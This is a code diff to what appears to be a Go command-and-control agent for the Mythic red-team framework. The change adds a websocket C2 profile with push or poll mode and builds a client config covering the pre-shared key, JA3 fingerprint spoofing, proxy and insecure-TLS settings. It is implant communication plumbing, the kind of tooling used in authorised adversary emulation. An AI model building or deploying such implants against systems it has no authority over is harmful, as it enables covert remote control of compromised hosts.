@@ -107,6 +107,12 @@ var useragent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KH
 // verbose a boolean value that determines if the Agent will print verbose output
 var verbose = "false"
 
+// pushMode determines if the websocket C2 profile should use push mode (true) or poll mode (false)
+var pushMode = "false"
+
+// wsEndpoint is the URI path for the websocket connection (e.g., "socket")
+var wsEndpoint = "socket"
+
 func main() {
 	core.Verbose, _ = strconv.ParseBool(verbose)
 	core.Debug, _ = strconv.ParseBool(debug)
@@ -173,6 +179,47 @@ func main() {
 
 		// Get the client
 		client, err = mythic.New(clientConfig)
+		if err != nil {
+			if core.Verbose {
+				color.Red(err.Error())
+			}
+			os.Exit(1)
+		}
+	case "websocket":
+		// Mythic WebSocket C2 profile client configuration
+		clientConfig := mythic.Config{
+			AgentID:      a.ID(),
+			AuthPackage:  auth,
+			PayloadID:    payloadID,
+			URL:          url,
+			PSK:          psk,
+			UserAgent:    useragent,
+			JA3:          ja3,
+			Parrot:       parrot,
+			Host:         host,
+			Headers:      headers,
+			Proxy:        proxy,
+			Padding:      padding,
+			InsecureTLS:  !verify,
+			Transformers: transforms,
+			ClientType:   httpClient,
+		}
+
+		// Parse http or https for the inner client protocol
+		if strings.HasPrefix(url, "wss://") || strings.HasPrefix(url, "https://") {
+			clientConfig.Protocol = "https"
+		} else {
+			clientConfig.Protocol = "http"
+		}
+
+		push, _ := strconv.ParseBool(pushMode)
+		wsConfig := mythic.WSConfig{
+			Config:   clientConfig,
+			PushMode: push,
+			Endpoint: wsEndpoint,
+		}
+
+		client, err = mythic.NewWS(wsConfig)
 		if err != nil {
 			if core.Verbose {
 				color.Red(err.Error())
